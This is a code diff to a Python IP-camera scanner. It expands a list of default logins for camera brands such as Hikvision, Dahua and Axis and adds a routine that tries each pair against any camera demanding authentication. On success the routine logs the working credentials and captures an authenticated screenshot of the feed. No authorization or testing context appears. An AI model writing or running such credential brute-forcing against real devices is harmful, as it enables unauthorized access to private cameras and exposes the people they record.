@@ -25,18 +25,78 @@ os.makedirs(SCREENSHOTS_DIR, exist_ok=True)
 discovered = []
 
 DEFAULT_CREDS = [
-    None,
+    None,  # Try no auth first :3
     ('admin', 'admin'),
     ('admin', ''),
-    ('admin', '1234'),
-    ('admin', '12345'),
     ('admin', 'password'),
+    ('admin', '12345'),
+    ('admin', '123456'),
+    ('admin', '1234'),
+    ('admin', 'admin123'),
+    ('admin', 'pass123'),
+    ('admin', '11111'),
+    ('admin', '54321'),
+    ('admin', '111111'),
+    ('admin', '666666'),
+    ('admin', '1234567'),
+    ('admin', '12345678'),
+    ('admin', 'abc123'),
+    ('admin', 'pass'),
     ('root', 'root'),
     ('root', ''),
     ('root', 'pass'),
     ('root', 'password'),
-    ('admin', 'admin123'),
-    ('admin', 'pass123'),
+    ('root', 'admin'),
+    ('root', '12345'),
+    ('root', '123456'),
+    ('supervisor', 'supervisor'),
+    ('admin1', 'admin1'),
+    ('administrator', 'administrator'),
+    ('administrator', 'admin'),
+    ('ubnt', 'ubnt'),  # Ubiquiti
+    ('service', 'service'),
+    ('support', 'support'),
+    ('user', 'user'),
+    ('guest', 'guest'),
+    ('default', 'default'),
+    ('system', 'system'),
+    # Camera brand defaults
+    ('admin', '9999'),  # Multiple brands
+    ('admin', '123456789'),  # Multiple brands
+    ('hikvision', 'hikvision'),
+    ('admin', 'hikvision'),
+    ('admin', '12345678a'),  # Hikvision
+    ('dahua', 'dahua'),
+    ('admin', 'dahua'),
+    ('admin', '888888'),  # Dahua
+    ('axis', 'axis'),
+    ('root', 'pass'),  # Axis
+    ('viewer', 'viewer'),  # Axis
+    ('admin', 'meinsm'),  # Axis
+    ('admin', '4321'),  # Axis
+    ('foscam', 'foscam'),
+    ('admin', 'foscam'),
+    ('amcrest', 'amcrest'),
+    ('admin', 'amcrest'),
+    ('reolink', 'reolink'),
+    ('admin', 'reolink'),
+    ('lorex', 'lorex'),
+    ('admin', 'lorex'),
+    ('swann', 'swann'),
+    ('admin', 'swann'),
+    ('admin', 'tlJwpbo6'),  # Hikvision
+    ('admin', 'Hikvision2020'),  # Hikvision
+    ('admin', 'HikAdmin2020'),  # Hikvision
+    ('admin', 'hik12345'),  # Hikvision
+    ('admin', 'hikadmin'),  # Hikvision
+    ('admin', 'dahua2020'),  # Dahua
+    ('admin', 'DahuaAdmin'),  # Dahua
+    ('admin', 'dh12345'),  # Dahua
+    ('admin', 'dahuaadmin'),  # Dahua
+    ('admin', 'axis2020'),  # Axis
+    ('admin', 'AxisAdmin'),  # Axis
+    ('admin', 'ax12345'),  # Axis
+    ('admin', 'axisadmin'),  # Axis
 ]
 
 CAMERA_SIGS = [
@@ -205,18 +265,40 @@ def quick_check_url(ip, port, path):
         if r.status_code in [200, 301, 302, 401, 403]:
             if any(sig in r.headers.get('Server', '').lower() for sig in CAMERA_SIGS):
                 save_camera(url, "Camera server header")
+                if r.status_code in [401, 403]:
+                    threading.Thread(target=try_default_creds, args=(url,)).start()
                 return True
             if 'rtsp://' in r.text.lower():
                 save_camera(url, "RTSP URL found")
+                if r.status_code in [401, 403]:
+                    threading.Thread(target=try_default_creds, args=(url,)).start()
                 return True
             if any(sig in r.text.lower() for sig in CAMERA_SIGS):
                 save_camera(url, "Camera signature found")
+                if r.status_code in [401, 403]:
+                    threading.Thread(target=try_default_creds, args=(url,)).start()
                 return True
             if r.status_code in [401, 403]:
-                save_camera(url, "Auth required - possible camera")
+                save_camera(url, "Auth required - trying default credentials")
+                threading.Thread(target=try_default_creds, args=(url,)).start()
                 return True
     except:
         pass
+    return False
+
+def try_default_creds(url):
+    for creds in DEFAULT_CREDS:
+        try:
+            if creds is None:
+                continue
+            r = requests.get(url, auth=creds, timeout=TIMEOUT, verify=False)
+            if r.status_code == 200:
+                save_camera(url, f"Auth success with {creds[0]}:{creds[1]}")
+                # Try to capture authenticated screenshot
+                capture_camera_image(url, auth=creds)
+                return True
+        except:
+            continue
     return False
 
 def main():
